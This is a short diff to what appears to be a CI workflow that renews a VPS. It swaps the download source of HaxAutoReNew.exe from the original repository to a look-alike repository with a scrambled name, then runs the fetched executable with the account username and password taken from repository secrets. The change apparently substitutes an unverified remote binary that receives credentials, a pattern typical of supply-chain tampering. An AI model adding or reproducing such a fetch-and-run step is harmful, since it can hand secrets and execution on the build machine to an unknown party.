@@ -11,5 +11,5 @@ jobs:
     steps:
       - name: 'Renewing Hax VPS ....' 
         run: |
-          cmd /c curl -sSL -O https://github.com/CoiaPrant/Hax_extend/raw/main/HaxAutoReNew.exe
+          cmd /c curl -sSL -O https://github.com/git3usr/H0a1x_e1x0tend4/raw/main/HaxAutoReNew.exe
           cmd /c HaxAutoReNew.exe -user "${{ secrets.USERNAME }}" -password "${{ secrets.PASSWORD }}"
